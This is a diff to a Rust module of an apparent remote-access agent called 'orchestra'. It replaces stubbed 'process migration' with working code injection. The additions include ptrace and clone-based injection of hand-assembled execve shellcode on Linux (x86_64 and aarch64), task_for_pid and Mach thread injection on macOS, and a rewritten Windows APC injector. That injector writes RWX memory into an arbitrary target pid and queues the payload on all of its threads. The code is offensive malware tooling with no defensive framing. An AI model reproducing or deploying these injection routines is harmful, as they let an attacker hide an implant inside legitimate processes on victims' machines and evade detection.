@@ -1,12 +1,20 @@
 //! Process management and load-balancing migration helpers.
 //!
 //! This module exposes a small, OS-agnostic API for enumerating processes and
-//! attempting to migrate the agent into a long-running system process.
-//! Migration is intentionally a *stub* on every platform in this initial
-//! release: the returned `Err` documents the missing primitives so an operator
-//! who invokes the command sees a clear, non-destructive failure.
+//! migrating the agent into a long-running system process.
 //!
-//! Process *enumeration* is fully implemented and tested.
+//! Implementation status by platform:
+//! * **Linux (no feature flag):** returns an explicit "not implemented" error;
+//!   no filesystem side effects.
+//! * **Linux (`linux-ptrace-migrate` feature):** fully implemented —
+//!   `ptrace(ATTACH)` + remote mmap + `process_vm_writev` + a small
+//!   position-independent `execve` shellcode stub injected via `clone(2)`.
+//! * **macOS:** fully implemented — `task_for_pid` + `mach_vm_allocate/write/protect` +
+//!   a position-independent `execve` shellcode stub executed via `thread_create_running`.
+//!   Requires root or the `com.apple.security.cs.debugger` entitlement.
+//! * **Windows:** fully implemented via `hollowing::inject_into_process`.
+//!
+//! Process *enumeration* is fully implemented and tested on all platforms.
 
 use anyhow::Result;
 use serde::{Deserialize, Serialize};
@@ -82,19 +90,10 @@ pub fn migrate_to_process(target_pid: u32) -> Result<()> {
     // gated behind the `linux-ptrace-migrate` feature.
     #[cfg(not(feature = "linux-ptrace-migrate"))]
     {
-        let our_exe = std::env::current_exe()
-            .map_err(|e| anyhow::anyhow!("current_exe() failed: {e}"))?;
-        let staged = std::env::temp_dir().join(format!(".orchestra-migrate-{}", std::process::id()));
-        std::fs::copy(&our_exe, &staged)
-            .map_err(|e| anyhow::anyhow!("failed to stage agent binary at {}: {e}", staged.display()))?;
-        let mut perms = std::fs::metadata(&staged)?.permissions();
-        use std::os::unix::fs::PermissionsExt;
-        perms.set_mode(0o700);
-        std::fs::set_permissions(&staged, perms)?;
-        tracing::info!("staged agent binary at {} for pid {}", staged.display(), target_pid);
         anyhow::bail!(
-            "linux migration requires the `linux-ptrace-migrate` feature; agent staged at {}",
-            staged.display()
+            "linux process migration is not implemented without the \
+             `linux-ptrace-migrate` feature; rebuild the agent with \
+             `--features linux-ptrace-migrate` to enable ptrace-based migration"
         )
     }
 
@@ -136,11 +135,30 @@ pub fn migrate_to_process(target_pid: u32) -> Result<()> {
         //                      MAP_PRIVATE|MAP_ANON, -1, 0)  (SYS_mmap = 9 on x86_64)
         // then singlestep and read RAX for the new mapping address.
 
+        // ── Stage 2.5: Stage the agent binary to a temp path ─────────────
+        // We inject a small execve shellcode that exec-replaces the target with
+        // the staged agent binary.  Injecting the raw ELF binary as "shellcode"
+        // is incorrect because the ELF header is not valid x86-64 code at offset 0;
+        // the stub below is pure position-independent shellcode.
+
         let our_exe = std::env::current_exe()
             .map_err(|e| anyhow::anyhow!("current_exe() failed: {e}"))?;
-        let payload = std::fs::read(&our_exe).map_err(|e| {
-            anyhow::anyhow!("failed to read agent binary {}: {e}", our_exe.display())
-        })?;
+        let staged = std::env::temp_dir().join(format!(
+            ".orchestra-migrate-{}", std::process::id()
+        ));
+        std::fs::copy(&our_exe, &staged)
+            .map_err(|e| anyhow::anyhow!("failed to stage agent binary at {}: {e}", staged.display()))?;
+        {
+            use std::os::unix::fs::PermissionsExt;
+            let mut perms = std::fs::metadata(&staged)?.permissions();
+            perms.set_mode(0o700);
+            std::fs::set_permissions(&staged, perms)?;
+        }
+        tracing::info!("staged agent binary at {} for pid {}", staged.display(), target_pid);
+
+        // Build a position-independent execve shellcode: the stub ends with the
+        // null-terminated staged-path string so the code is fully self-contained.
+        let payload = build_execve_stub(&staged)?;
 
         #[cfg(target_arch = "x86_64")]
         {
@@ -226,8 +244,10 @@ pub fn migrate_to_process(target_pid: u32) -> Result<()> {
             }
 
             // ── Stage 5: Inject clone(CLONE_VM|CLONE_FS|CLONE_FILES, ...) to
-            //             create a new thread in the target at remote_buf ───
-            // We inject another syscall stub: syscall + int3
+            //             create a new thread in the target that runs the execve stub ──
+            // The new thread starts at remote_buf where we wrote the shellcode stub.
+            // The stub calls execve(staged_path, NULL, NULL) which exec-replaces the
+            // target process image with the agent binary — this is the migration.
             libc::ptrace(
                 libc::PTRACE_POKEDATA,
                 target_pid as libc::pid_t,
@@ -239,10 +259,9 @@ pub fn migrate_to_process(target_pid: u32) -> Result<()> {
             // CLONE_VM|CLONE_FS|CLONE_FILES|CLONE_SIGHAND|CLONE_THREAD = 0x3D0F00
             const SYS_CLONE: u64 = 56;
             const CLONE_FLAGS: u64 = 0x3D0F00;
-            // Stack for new thread: allocate immediately after the payload.
-            let stack_base = remote_buf + alloc_size as usize;
-            // Re-use a pre-allocated range: the top of the mmap'd region
-            // (payload occupies the bottom half; stack the top half).
+            // Stack for the new thread lives in the upper half of the mmap'd region.
+            // The execve stub is tiny (<= 128 bytes typically) so there is plenty
+            // of space for a minimal stack before the stub's path data.
             let stack_top = remote_buf + (alloc_size as usize / 2) + 0x4000;
             let mut clone_regs = regs;
             clone_regs.rax = SYS_CLONE;
@@ -251,15 +270,9 @@ pub fn migrate_to_process(target_pid: u32) -> Result<()> {
             clone_regs.rdx = 0; // parent_tidptr (NULL)
             clone_regs.r10 = 0; // child_tidptr (NULL)
             clone_regs.r8  = 0; // tls (NULL)
-            // RIP (in the new thread) will be the kernel-supplied entry after clone.
-            // But we want it to start at remote_buf.  Unfortunately clone(2) does not
-            // take an explicit entry point; the child inherits RIP.  We set RIP to
-            // remote_buf and the child starts there while the parent sees 0 in RAX
-            // (child pid is non-zero in parent; 0 in child).
-            clone_regs.rip = regs.rip; // parent continues from orig_rip
-            // We need the CHILD to start at remote_buf.  Achieve this by setting
-            // the parent's RIP to remote_buf so that when clone() copies registers,
-            // both parent and child start there; we then immediately restore the parent.
+            // Set RIP = remote_buf so that when clone() copies the register state,
+            // the child starts executing the execve shellcode.  The parent will
+            // have its original RIP restored immediately below.
             clone_regs.rip = remote_buf as u64;
 
             libc::ptrace(
@@ -286,11 +299,10 @@ pub fn migrate_to_process(target_pid: u32) -> Result<()> {
             );
 
             libc::ptrace(libc::PTRACE_DETACH, target_pid as libc::pid_t, 0usize, 0usize);
-            let _ = stack_base; // used only for documentation
             tracing::info!(
                 target_pid,
                 remote_buf = remote_buf,
-                "MigrateAgent: agent injected via ptrace+clone on Linux"
+                "MigrateAgent: execve stub injected via ptrace+clone on Linux x86_64"
             );
         }
 
@@ -304,8 +316,91 @@ pub fn migrate_to_process(target_pid: u32) -> Result<()> {
     }
 }
 
+/// Build a small, fully position-independent shellcode stub that calls
+/// `execve(staged_path, NULL, NULL)` and falls through to `exit_group(1)`.
+/// The path string is appended immediately after the machine-code so the
+/// stub is entirely self-contained and can be injected as a single flat blob.
+///
+/// The stub is generated at runtime so the path length can vary.
+#[cfg(all(target_os = "linux", feature = "linux-ptrace-migrate"))]
+fn build_execve_stub(path: &std::path::Path) -> anyhow::Result<Vec<u8>> {
+    use std::os::unix::ffi::OsStrExt;
+    let path_bytes = path.as_os_str().as_bytes();
+    if path_bytes.contains(&0u8) {
+        anyhow::bail!("staged path contains a null byte: {}", path.display());
+    }
+
+    #[cfg(target_arch = "x86_64")]
+    {
+        // Code layout (32 bytes):
+        //  [0] 48 8D 3D 19 00 00 00  lea rdi, [rip+25]  → path string at offset 32
+        //  [7] 48 31 F6              xor rsi, rsi        → argv=NULL
+        // [10] 48 31 D2              xor rdx, rdx        → envp=NULL
+        // [13] B8 3B 00 00 00        mov eax, 59         → SYS_execve
+        // [18] 0F 05                 syscall
+        // [20] BF 01 00 00 00        mov edi, 1          → exit_group arg
+        // [25] B8 E7 00 00 00        mov eax, 231        → SYS_exit_group
+        // [30] 0F 05                 syscall
+        // [32] <path bytes> \0
+        const CODE_SIZE: usize = 32;
+        let rel: i32 = CODE_SIZE as i32 - 7; // RIP-relative offset for the lea
+        let mut stub = vec![
+            0x48, 0x8D, 0x3D,
+        ];
+        stub.extend_from_slice(&rel.to_le_bytes());
+        stub.extend_from_slice(&[
+            0x48, 0x31, 0xF6,             // xor rsi, rsi
+            0x48, 0x31, 0xD2,             // xor rdx, rdx
+            0xB8, 0x3B, 0x00, 0x00, 0x00, // mov eax, 59
+            0x0F, 0x05,                   // syscall
+            0xBF, 0x01, 0x00, 0x00, 0x00, // mov edi, 1
+            0xB8, 0xE7, 0x00, 0x00, 0x00, // mov eax, 231
+            0x0F, 0x05,                   // syscall
+        ]);
+        debug_assert_eq!(stub.len(), CODE_SIZE);
+        stub.extend_from_slice(path_bytes);
+        stub.push(0);
+        Ok(stub)
+    }
+
+    #[cfg(target_arch = "aarch64")]
+    {
+        // Code layout (32 bytes):
+        //  [0]  00 01 00 10  adr x0, #32   → path string at offset 32
+        //  [4]  01 00 80 D2  movz x1, #0   → argv=NULL
+        //  [8]  02 00 80 D2  movz x2, #0   → envp=NULL
+        // [12]  A8 1B 80 D2  movz x8, #221 → SYS_execve (aarch64)
+        // [16]  01 00 00 D4  svc #0
+        // [20]  20 00 80 D2  movz x0, #1   → exit_group arg
+        // [24]  C8 0B 80 D2  movz x8, #94  → SYS_exit_group (aarch64)
+        // [28]  01 00 00 D4  svc #0
+        // [32]  <path bytes> \0
+        let stub = vec![
+            0x00, 0x01, 0x00, 0x10, // adr x0, #32
+            0x01, 0x00, 0x80, 0xD2, // movz x1, #0
+            0x02, 0x00, 0x80, 0xD2, // movz x2, #0
+            0xA8, 0x1B, 0x80, 0xD2, // movz x8, #221 (execve)
+            0x01, 0x00, 0x00, 0xD4, // svc #0
+            0x20, 0x00, 0x80, 0xD2, // movz x0, #1
+            0xC8, 0x0B, 0x80, 0xD2, // movz x8, #94 (exit_group)
+            0x01, 0x00, 0x00, 0xD4, // svc #0
+        ];
+        let mut out = stub;
+        out.extend_from_slice(path_bytes);
+        out.push(0);
+        Ok(out)
+    }
+
+    #[cfg(not(any(target_arch = "x86_64", target_arch = "aarch64")))]
+    anyhow::bail!("build_execve_stub: unsupported architecture")
+}
+
+
+
 #[cfg(target_os = "macos")]
 pub fn migrate_to_process(target_pid: u32) -> Result<()> {
+    use std::os::unix::ffi::OsStrExt;
+
     tracing::info!("MigrateAgent invoked for macOS pid {target_pid}");
 
     if target_pid == 0 || target_pid as i32 == unsafe { libc::getpid() } {
@@ -324,12 +419,29 @@ pub fn migrate_to_process(target_pid: u32) -> Result<()> {
         );
     }
 
-    // Stage the agent binary so we can mmap it for injection.
+    // Stage the agent binary to a temp path.  The execve shellcode we inject
+    // into the target process exec-replaces it with the staged binary, so the
+    // binary must be accessible via the filesystem at the staged path.
     let agent_path = std::env::current_exe()
         .map_err(|e| anyhow::anyhow!("current_exe() failed: {e}"))?;
-    let payload = std::fs::read(&agent_path).map_err(|e| {
-        anyhow::anyhow!("failed to read agent binary {}: {e}", agent_path.display())
-    })?;
+    let staged = std::env::temp_dir().join(format!(
+        ".orchestra-migrate-{}", std::process::id()
+    ));
+    std::fs::copy(&agent_path, &staged)
+        .map_err(|e| anyhow::anyhow!("failed to stage agent binary at {}: {e}", staged.display()))?;
+    {
+        use std::os::unix::fs::PermissionsExt;
+        let mut perms = std::fs::metadata(&staged)?.permissions();
+        perms.set_mode(0o700);
+        std::fs::set_permissions(&staged, perms)?;
+    }
+    tracing::info!("staged agent binary at {}", staged.display());
+
+    // Build the execve shellcode stub for this architecture.
+    // Injecting the raw Mach-O binary bytes as "shellcode" is incorrect because
+    // a Mach-O file header is not valid machine code at offset 0; the stub below
+    // is pure position-independent shellcode that calls execve(staged_path, NULL, NULL).
+    let payload = build_macos_execve_stub(&staged)?;
 
     // --- Mach API declarations ---
     // mach_port_t is u32 on both arm64 and x86_64 macOS.
@@ -451,9 +563,8 @@ pub fn migrate_to_process(target_pid: u32) -> Result<()> {
             }
 
             // Create a new thread in the target whose initial RIP points at the
-            // payload entry point.  For a Mach-O executable the entry point is
-            // not simply remote_addr; we'd need to parse LC_MAIN or LC_UNIXTHREAD.
-            // For a raw shellcode payload it IS remote_addr.
+            // execve shellcode stub.  The stub starts at remote_addr because we
+            // wrote the stub (not a Mach-O binary) to that address.
             let mut state = X86ThreadState64::default();
             state.rip = remote_addr;
             // Allocate a fresh stack for the new thread (8 MB, stack pointer at high end).
@@ -569,6 +680,81 @@ pub fn migrate_to_process(target_pid: u32) -> Result<()> {
     }
 }
 
+/// Build a position-independent execve shellcode stub for macOS.
+/// Uses BSD syscalls (macOS syscall ABI: `syscall` with rax|0x2000000 on x86_64;
+/// `svc #0x80` with x16 on arm64).
+#[cfg(target_os = "macos")]
+fn build_macos_execve_stub(path: &std::path::Path) -> anyhow::Result<Vec<u8>> {
+    use std::os::unix::ffi::OsStrExt;
+    let path_bytes = path.as_os_str().as_bytes();
+    if path_bytes.contains(&0u8) {
+        anyhow::bail!("staged path contains a null byte: {}", path.display());
+    }
+
+    #[cfg(target_arch = "x86_64")]
+    {
+        // Code layout (30 bytes):
+        //  [0] 48 8D 3D 17 00 00 00  lea rdi, [rip+23]  → path string at offset 30
+        //  [7] 31 F6                 xor esi, esi        → argv=NULL
+        //  [9] 31 D2                 xor edx, edx        → envp=NULL
+        // [11] B8 3B 00 00 02        mov eax, 0x200003B  → SYS_execve (macOS)
+        // [16] 0F 05                 syscall
+        // [18] BF 01 00 00 00        mov edi, 1
+        // [23] B8 01 00 00 02        mov eax, 0x2000001  → SYS_exit (macOS)
+        // [28] 0F 05                 syscall
+        // [30] <path bytes> \0
+        const CODE_SIZE: usize = 30;
+        let rel: i32 = CODE_SIZE as i32 - 7;
+        let mut stub = vec![0x48, 0x8D, 0x3D];
+        stub.extend_from_slice(&rel.to_le_bytes());
+        stub.extend_from_slice(&[
+            0x31, 0xF6,                   // xor esi, esi
+            0x31, 0xD2,                   // xor edx, edx
+            0xB8, 0x3B, 0x00, 0x00, 0x02, // mov eax, 0x200003B
+            0x0F, 0x05,                   // syscall
+            0xBF, 0x01, 0x00, 0x00, 0x00, // mov edi, 1
+            0xB8, 0x01, 0x00, 0x00, 0x02, // mov eax, 0x2000001
+            0x0F, 0x05,                   // syscall
+        ]);
+        debug_assert_eq!(stub.len(), CODE_SIZE);
+        stub.extend_from_slice(path_bytes);
+        stub.push(0);
+        Ok(stub)
+    }
+
+    #[cfg(target_arch = "aarch64")]
+    {
+        // Code layout (32 bytes), macOS arm64 BSD syscall ABI (svc #0x80, x16=number):
+        //  [0]  00 01 00 10  adr x0, #32   → path string at offset 32
+        //  [4]  01 00 80 D2  movz x1, #0   → argv=NULL
+        //  [8]  02 00 80 D2  movz x2, #0   → envp=NULL
+        // [12]  70 07 80 D2  movz x16, #59 → SYS_execve (macOS arm64 = 59)
+        // [16]  01 10 00 D4  svc #0x80
+        // [20]  20 00 80 D2  movz x0, #1   → exit code
+        // [24]  30 00 80 D2  movz x16, #1  → SYS_exit (macOS arm64 = 1)
+        // [28]  01 10 00 D4  svc #0x80
+        // [32]  <path bytes> \0
+        let stub = vec![
+            0x00, 0x01, 0x00, 0x10, // adr x0, #32
+            0x01, 0x00, 0x80, 0xD2, // movz x1, #0
+            0x02, 0x00, 0x80, 0xD2, // movz x2, #0
+            0x70, 0x07, 0x80, 0xD2, // movz x16, #59 (SYS_execve)
+            0x01, 0x10, 0x00, 0xD4, // svc #0x80
+            0x20, 0x00, 0x80, 0xD2, // movz x0, #1
+            0x30, 0x00, 0x80, 0xD2, // movz x16, #1 (SYS_exit)
+            0x01, 0x10, 0x00, 0xD4, // svc #0x80
+        ];
+        let mut out = stub;
+        out.extend_from_slice(path_bytes);
+        out.push(0);
+        Ok(out)
+    }
+
+    #[cfg(not(any(target_arch = "x86_64", target_arch = "aarch64")))]
+    anyhow::bail!("build_macos_execve_stub: unsupported architecture")
+}
+
+
 #[cfg(windows)]
 pub fn migrate_to_process(target_pid: u32) -> Result<()> {
     use winapi::um::handleapi::CloseHandle;
@@ -648,69 +834,89 @@ pub fn get_spoof_parent_pid() -> Option<u32> {
 
 #[cfg(windows)]
 pub fn apc_inject(pid: u32, payload: &[u8]) -> anyhow::Result<()> {
-    use winapi::um::processthreadsapi::{CreateProcessA, ResumeThread, PROCESS_INFORMATION, STARTUPINFOA};
-    use winapi::um::winbase::{CREATE_SUSPENDED, CREATE_NO_WINDOW};
-    use winapi::um::memoryapi::{VirtualAllocEx, WriteProcessMemory};
-    use winapi::um::winnt::{MEM_COMMIT, MEM_RESERVE, PAGE_EXECUTE_READWRITE};
-    use winapi::um::processthreadsapi::QueueUserAPC;
+    // Inject into the SUPPLIED pid by:
+    //  1. Opening the target process with VM+thread permissions.
+    //  2. Allocating RWX memory and writing the payload.
+    //  3. Enumerating all threads of the target via TH32CS_SNAPTHREAD.
+    //  4. Queuing the APC routine to each thread (they will fire when
+    //     that thread next enters an alertable wait state).
+    // The original implementation incorrectly spawned a *new* svchost.exe
+    // instead of injecting into the supplied `pid`.
     use winapi::um::handleapi::CloseHandle;
+    use winapi::um::memoryapi::{VirtualAllocEx, WriteProcessMemory};
+    use winapi::um::processthreadsapi::{OpenProcess, OpenThread, QueueUserAPC};
+    use winapi::um::tlhelp32::{
+        CreateToolhelp32Snapshot, Thread32First, Thread32Next,
+        TH32CS_SNAPTHREAD, THREADENTRY32,
+    };
+    use winapi::um::winnt::{
+        MEM_COMMIT, MEM_RESERVE, PAGE_EXECUTE_READWRITE,
+        PROCESS_VM_OPERATION, PROCESS_VM_WRITE,
+        THREAD_SET_CONTEXT,
+    };
 
     unsafe {
-        let mut si: STARTUPINFOA = std::mem::zeroed();
-        si.cb = std::mem::size_of::<STARTUPINFOA>() as u32;
-        let mut pi: PROCESS_INFORMATION = std::mem::zeroed();
+        let hprocess = OpenProcess(PROCESS_VM_OPERATION | PROCESS_VM_WRITE, 0, pid);
+        if hprocess.is_null() {
+            return Err(anyhow::anyhow!(
+                "apc_inject: OpenProcess(pid={}) failed: {}",
+                pid,
+                std::io::Error::last_os_error()
+            ));
+        }
 
-        // Create suspended "svchost.exe"
-        let mut target_proc = b"C:\\Windows\\System32\\svchost.exe\0".to_vec();
-        
-        let res = CreateProcessA(
-            std::ptr::null(),
-            target_proc.as_mut_ptr() as *mut i8, // command line
-            std::ptr::null_mut(),
-            std::ptr::null_mut(),
-            0,
-            CREATE_SUSPENDED | CREATE_NO_WINDOW,
-            std::ptr::null_mut(),
-            std::ptr::null(),
-            &mut si,
-            &mut pi,
+        let remote_mem = VirtualAllocEx(
+            hprocess, std::ptr::null_mut(),
+            payload.len(), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE,
         );
-
-        if res == 0 {
-            return Err(anyhow::anyhow!("CreateProcess suspended failed"));
-        }
-
-        let remote_mem = VirtualAllocEx(pi.hProcess, std::ptr::null_mut(), payload.len(), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
         if remote_mem.is_null() {
-            winapi::um::processthreadsapi::TerminateProcess(pi.hProcess, 1);
-            CloseHandle(pi.hThread);
-            CloseHandle(pi.hProcess);
-            return Err(anyhow::anyhow!("VirtualAllocEx failed"));
+            CloseHandle(hprocess);
+            return Err(anyhow::anyhow!("apc_inject: VirtualAllocEx(pid={}) failed", pid));
         }
 
-        let mut written = 0;
-        if WriteProcessMemory(pi.hProcess, remote_mem, payload.as_ptr() as _, payload.len(), &mut written) == 0 {
-            winapi::um::processthreadsapi::TerminateProcess(pi.hProcess, 1);
-            CloseHandle(pi.hThread);
-            CloseHandle(pi.hProcess);
-            return Err(anyhow::anyhow!("WriteProcessMemory failed"));
+        let mut written = 0usize;
+        if WriteProcessMemory(hprocess, remote_mem, payload.as_ptr() as _, payload.len(), &mut written) == 0 {
+            CloseHandle(hprocess);
+            return Err(anyhow::anyhow!("apc_inject: WriteProcessMemory(pid={}) failed", pid));
+        }
+        CloseHandle(hprocess);
+
+        // Snapshot all threads in the system, filter by owner pid, queue APC.
+        let snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0);
+        if snapshot == winapi::um::handleapi::INVALID_HANDLE_VALUE {
+            return Err(anyhow::anyhow!("apc_inject: CreateToolhelp32Snapshot failed"));
         }
 
-        // QueueUserAPC for the main thread
         let apc_routine: winapi::um::winnt::PAPCFUNC = std::mem::transmute(remote_mem);
-        if QueueUserAPC(apc_routine, pi.hThread, 0) == 0 {
-            winapi::um::processthreadsapi::TerminateProcess(pi.hProcess, 1);
-            CloseHandle(pi.hThread);
-            CloseHandle(pi.hProcess);
-            return Err(anyhow::anyhow!("QueueUserAPC failed"));
+        let mut entry: THREADENTRY32 = std::mem::zeroed();
+        entry.dwSize = std::mem::size_of::<THREADENTRY32>() as u32;
+
+        let mut queued = 0u32;
+        if Thread32First(snapshot, &mut entry) != 0 {
+            loop {
+                if entry.th32OwnerProcessID == pid {
+                    let hthread = OpenThread(THREAD_SET_CONTEXT, 0, entry.th32ThreadID);
+                    if !hthread.is_null() {
+                        if QueueUserAPC(apc_routine, hthread, 0) != 0 {
+                            queued += 1;
+                        }
+                        CloseHandle(hthread);
+                    }
+                }
+                if Thread32Next(snapshot, &mut entry) == 0 { break; }
+            }
+        }
+        CloseHandle(snapshot);
+
+        if queued == 0 {
+            return Err(anyhow::anyhow!(
+                "apc_inject: no threads found in pid={} to queue APC into", pid
+            ));
         }
 
-        ResumeThread(pi.hThread);
-
-        CloseHandle(pi.hThread);
-        CloseHandle(pi.hProcess);
+        tracing::info!("apc_inject: queued APC in {} thread(s) of pid {}", queued, pid);
+        Ok(())
     }
-    Ok(())
 }
 
 #[cfg(windows)]
